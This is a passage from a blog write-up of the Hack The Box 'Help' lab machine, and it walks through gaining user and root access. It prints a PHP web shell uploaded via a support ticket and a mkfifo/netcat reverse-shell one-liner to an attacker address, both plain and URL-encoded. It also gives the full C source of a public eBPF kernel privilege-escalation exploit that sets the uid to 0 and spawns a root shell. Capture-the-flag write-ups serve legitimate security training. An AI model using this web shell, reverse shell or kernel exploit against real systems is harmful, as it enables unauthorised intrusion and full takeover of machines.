        <span class="k">print</span> <span class="n">url</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="k">print</span> <span class="s">"Sorry, I did not find anything"</span>
</code></pre></div></div>
<p>I went to the settings and changed the timezone to the same timezone as mine :
<br><img src="/images/hackthebox/help/16.png" alt="" class="align-center"><br><br>
The <code class="language-plaintext highlighter-rouge">php</code> file I’m going to upload is <code class="language-plaintext highlighter-rouge">simple-backdoor.php</code> which can be found in <code class="language-plaintext highlighter-rouge">/usr/share/webshells/php/simple-backdoor.php</code> in <code class="language-plaintext highlighter-rouge">kali</code> :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&gt;</span>

<span class="cp">&lt;?php</span>

<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])){</span>
        <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span><span class="p">;</span>
        <span class="nv">$cmd</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
        <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
        <span class="k">echo</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
        <span class="k">die</span><span class="p">;</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<span class="c">&lt;!--    http://michaeldaw.org   2006    --&gt;</span>
</code></pre></div></div>
<p>I submitted the ticket :
<br><img src="/images/hackthebox/help/17.png" alt="" class="align-center"><br><br>
Then I ran the exploit and it found the file immediately :
<code class="language-plaintext highlighter-rouge">python exploit.py http://10.10.10.121/support/ rick.php</code>
<br><img src="/images/hackthebox/help/18.png" alt="" class="align-center"><br><br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://help.htb/support/uploads/tickets/11559b997fcb9a724cbc0e2a6a4b98a3.php
</code></pre></div></div>
<p><br><img src="/images/hackthebox/help/19.png" alt="" class="align-center"><br><br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://help.htb/support/uploads/tickets/11559b997fcb9a724cbc0e2a6a4b98a3.php?cmd=whoami
</code></pre></div></div>
<p><br><img src="/images/hackthebox/help/20.png" alt="" class="align-center"><br><br>
It’s working, let’s get a reverse shell, I used this payload (url encoded) :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://help.htb/support/uploads/tickets/11559b997fcb9a724cbc0e2a6a4b98a3.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201337%20%3E%2Ftmp%2Ff
</code></pre></div></div>
<p><br><img src="/images/hackthebox/help/21.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/help/22.png" alt="" class="align-center"><br><br>
We owned user.<br></p>

<h2 id="kernel-exploit-privilege-escalation-and-root-flag">Kernel Exploit, Privilege Escalation and Root Flag</h2>
<p>Privilege escalation on this machine was very easy, just a kernel exploit. One of the first things to check after getting a shell is the system info :
<code class="language-plaintext highlighter-rouge">uname -a</code>
<br><img src="/images/hackthebox/help/23.png" alt="" class="align-center"><br><br>
That kernel version is vulnerable to a local privilege escalation vulnerability and there’s an <a href="https://www.exploit-db.com/exploits/44298" target="_blank" rel="noopener noreferrer">exploit</a> published for it.<br>
<code class="language-plaintext highlighter-rouge">exploit.c</code> :</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
#include &lt;linux/bpf.h&gt;
#include &lt;linux/unistd.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/un.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;stdint.h&gt;
</span>
<span class="cp">#define PHYS_OFFSET 0xffff880000000000
#define CRED_OFFSET 0x5f8
#define UID_OFFSET 4
#define LOG_BUF_SIZE 65536
#define PROGSIZE 328
</span>
<span class="kt">int</span> <span class="n">sockets</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
<span class="kt">int</span> <span class="n">mapfd</span><span class="p">,</span> <span class="n">progfd</span><span class="p">;</span>

<span class="kt">char</span> <span class="o">*</span><span class="n">__prog</span> <span class="o">=</span> 	<span class="s">"</span><span class="se">\xb4\x09\x00\x00\xff\xff\xff\xff</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x55\x09\x02\x00\xff\xff\xff\xff</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\xb7\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x18\x19\x00\x00\x03\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\xbf\x91\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\xbf\xa2\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x07\x02\x00\x00\xfc\xff\xff\xff</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x62\x0a\xfc\xff\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x85\x00\x00\x00\x01\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x55\x00\x01\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x79\x06\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\xbf\x91\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\xbf\xa2\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x07\x02\x00\x00\xfc\xff\xff\xff</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x62\x0a\xfc\xff\x01\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x85\x00\x00\x00\x01\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x55\x00\x01\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x79\x07\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\xbf\x91\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\xbf\xa2\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x07\x02\x00\x00\xfc\xff\xff\xff</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x62\x0a\xfc\xff\x02\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x85\x00\x00\x00\x01\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x55\x00\x01\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x79\x08\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\xbf\x02\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\xb7\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x55\x06\x03\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x79\x73\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x7b\x32\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x55\x06\x02\x00\x01\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x7b\xa2\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x7b\x87\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span><span class="p">;</span>

<span class="kt">char</span> <span class="n">bpf_log_buf</span><span class="p">[</span><span class="n">LOG_BUF_SIZE</span><span class="p">];</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">bpf_prog_load</span><span class="p">(</span><span class="k">enum</span> <span class="n">bpf_prog_type</span> <span class="n">prog_type</span><span class="p">,</span>
		  <span class="k">const</span> <span class="k">struct</span> <span class="n">bpf_insn</span> <span class="o">*</span><span class="n">insns</span><span class="p">,</span> <span class="kt">int</span> <span class="n">prog_len</span><span class="p">,</span>
		  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">license</span><span class="p">,</span> <span class="kt">int</span> <span class="n">kern_version</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
		<span class="p">.</span><span class="n">prog_type</span> <span class="o">=</span> <span class="n">prog_type</span><span class="p">,</span>
		<span class="p">.</span><span class="n">insns</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">insns</span><span class="p">,</span>
		<span class="p">.</span><span class="n">insn_cnt</span> <span class="o">=</span> <span class="n">prog_len</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">bpf_insn</span><span class="p">),</span>
		<span class="p">.</span><span class="n">license</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">license</span><span class="p">,</span>
		<span class="p">.</span><span class="n">log_buf</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">bpf_log_buf</span><span class="p">,</span>
		<span class="p">.</span><span class="n">log_size</span> <span class="o">=</span> <span class="n">LOG_BUF_SIZE</span><span class="p">,</span>
		<span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
	<span class="p">};</span>

	<span class="n">attr</span><span class="p">.</span><span class="n">kern_version</span> <span class="o">=</span> <span class="n">kern_version</span><span class="p">;</span>

	<span class="n">bpf_log_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	<span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">BPF_PROG_LOAD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">bpf_create_map</span><span class="p">(</span><span class="k">enum</span> <span class="n">bpf_map_type</span> <span class="n">map_type</span><span class="p">,</span> <span class="kt">int</span> <span class="n">key_size</span><span class="p">,</span> <span class="kt">int</span> <span class="n">value_size</span><span class="p">,</span>
		   <span class="kt">int</span> <span class="n">max_entries</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
		<span class="p">.</span><span class="n">map_type</span> <span class="o">=</span> <span class="n">map_type</span><span class="p">,</span>
		<span class="p">.</span><span class="n">key_size</span> <span class="o">=</span> <span class="n">key_size</span><span class="p">,</span>
		<span class="p">.</span><span class="n">value_size</span> <span class="o">=</span> <span class="n">value_size</span><span class="p">,</span>
		<span class="p">.</span><span class="n">max_entries</span> <span class="o">=</span> <span class="n">max_entries</span>
	<span class="p">};</span>

	<span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">BPF_MAP_CREATE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">bpf_update_elem</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">key</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
		<span class="p">.</span><span class="n">map_fd</span> <span class="o">=</span> <span class="n">mapfd</span><span class="p">,</span>
		<span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">key</span><span class="p">,</span>
		<span class="p">.</span><span class="n">value</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">value</span><span class="p">,</span>
		<span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
	<span class="p">};</span>

	<span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">BPF_MAP_UPDATE_ELEM</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">bpf_lookup_elem</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">value</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
		<span class="p">.</span><span class="n">map_fd</span> <span class="o">=</span> <span class="n">mapfd</span><span class="p">,</span>
		<span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">key</span><span class="p">,</span>
		<span class="p">.</span><span class="n">value</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">value</span><span class="p">,</span>
	<span class="p">};</span>

	<span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">BPF_MAP_LOOKUP_ELEM</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">__exit</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">err</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"error: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">err</span><span class="p">);</span>
	<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">prep</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">mapfd</span> <span class="o">=</span> <span class="n">bpf_create_map</span><span class="p">(</span><span class="n">BPF_MAP_TYPE_ARRAY</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">),</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span><span class="p">),</span> <span class="mi">3</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">mapfd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>

	<span class="n">progfd</span> <span class="o">=</span> <span class="n">bpf_prog_load</span><span class="p">(</span><span class="n">BPF_PROG_TYPE_SOCKET_FILTER</span><span class="p">,</span>
			<span class="p">(</span><span class="k">struct</span> <span class="n">bpf_insn</span> <span class="o">*</span><span class="p">)</span><span class="n">__prog</span><span class="p">,</span> <span class="n">PROGSIZE</span><span class="p">,</span> <span class="s">"GPL"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">progfd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>

	<span class="k">if</span><span class="p">(</span><span class="n">socketpair</span><span class="p">(</span><span class="n">AF_UNIX</span><span class="p">,</span> <span class="n">SOCK_DGRAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">sockets</span><span class="p">))</span>
		<span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>

	<span class="k">if</span><span class="p">(</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">sockets</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">SO_ATTACH_BPF</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">progfd</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">progfd</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">writemsg</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

	<span class="kt">ssize_t</span> <span class="n">n</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">sockets</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">"write"</span><span class="p">);</span>
		<span class="k">return</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">))</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"short write: %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
<span class="p">}</span>

<span class="cp">#define __update_elem(a, b, c) \
	bpf_update_elem(0, (a)); \
	bpf_update_elem(1, (b)); \
	bpf_update_elem(2, (c)); \
	writemsg();
</span>
<span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">get_value</span><span class="p">(</span><span class="kt">int</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">uint64_t</span> <span class="n">value</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">bpf_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">))</span>
		<span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>

	<span class="k">return</span> <span class="n">value</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">__get_fp</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">__update_elem</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

	<span class="k">return</span> <span class="n">get_value</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">__read</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">__update_elem</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

	<span class="k">return</span> <span class="n">get_value</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">__write</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">val</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">__update_elem</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">get_sp</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">return</span> <span class="n">addr</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mh">0x4000</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">pwn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">uint64_t</span> <span class="n">fp</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="n">task_struct</span><span class="p">,</span> <span class="n">credptr</span><span class="p">,</span> <span class="n">uidptr</span><span class="p">;</span>

	<span class="n">fp</span> <span class="o">=</span> <span class="n">__get_fp</span><span class="p">();</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
		<span class="n">__exit</span><span class="p">(</span><span class="s">"bogus fp"</span><span class="p">);</span>
	
	<span class="n">sp</span> <span class="o">=</span> <span class="n">get_sp</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">sp</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
		<span class="n">__exit</span><span class="p">(</span><span class="s">"bogus sp"</span><span class="p">);</span>
	
	<span class="n">task_struct</span> <span class="o">=</span> <span class="n">__read</span><span class="p">(</span><span class="n">sp</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">task_struct</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
		<span class="n">__exit</span><span class="p">(</span><span class="s">"bogus task ptr"</span><span class="p">);</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"task_struct = %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">task_struct</span><span class="p">);</span>

	<span class="n">credptr</span> <span class="o">=</span> <span class="n">__read</span><span class="p">(</span><span class="n">task_struct</span> <span class="o">+</span> <span class="n">CRED_OFFSET</span><span class="p">);</span> <span class="c1">// cred</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">credptr</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
		<span class="n">__exit</span><span class="p">(</span><span class="s">"bogus cred ptr"</span><span class="p">);</span>

	<span class="n">uidptr</span> <span class="o">=</span> <span class="n">credptr</span> <span class="o">+</span> <span class="n">UID_OFFSET</span><span class="p">;</span> <span class="c1">// uid</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">uidptr</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
		<span class="n">__exit</span><span class="p">(</span><span class="s">"bogus uid ptr"</span><span class="p">);</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"uidptr = %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">uidptr</span><span class="p">);</span>
	<span class="n">__write</span><span class="p">(</span><span class="n">uidptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// set both uid and gid to 0</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"spawning root shell</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="n">__exit</span><span class="p">(</span><span class="s">"not vulnerable?"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">prep</span><span class="p">();</span>
	<span class="n">pwn</span><span class="p">();</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>I ran a python server to host the exploit then I downloaded it on the box :
<br><img src="/images/hackthebox/help/24.png" alt="" class="align-center"><br><br>
Then I compiled the exploit and ran it :
<code class="language-plaintext highlighter-rouge">gcc -o exploit exploit.c</code>
<br><img src="/images/hackthebox/help/25.png" alt="" class="align-center"><br><br>
And we owned root !</p>

<p><br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Hack The Box write-up : <a href="/hack-the-box/sizzle/">Hack The Box - Sizzle</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/flujab/">Hack The Box - FluJab</a></p>


        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-06-08T07:00:00+02:00">June 8, 2019</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/hack-the-box/sizzle/" class="pagination--pager" title="Hack The Box - Sizzle
">Previous</a>
    
    
      <a href="/pwn/bof/" class="pagination--pager" title="pwnable.kr - bof
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
